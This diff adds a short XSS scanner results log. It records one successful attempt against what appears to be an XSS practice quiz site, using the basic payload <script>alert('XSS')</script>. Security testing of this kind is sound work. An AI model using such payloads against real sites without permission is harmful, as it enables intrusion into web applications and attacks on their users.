@@ -1,0 +1,11 @@
+Total XSS Attempts: 1
+Total Successful XSS Attempts: 1
+Total Failed XSS Attempts: 0
+
+--- Analyzed Results ---
+
+URL: https://xss-quiz.int21h.jp/?sid=cfb6c997fc170746761dda3e16f2062c6f5efd32/?sid=5ea18a83d86914179f91e4481c4421c2c1dd0896
+Payload: <script>alert('XSS')</script>
+Status: 200
+XSS Successful: Yes
+--------------------------------------------------
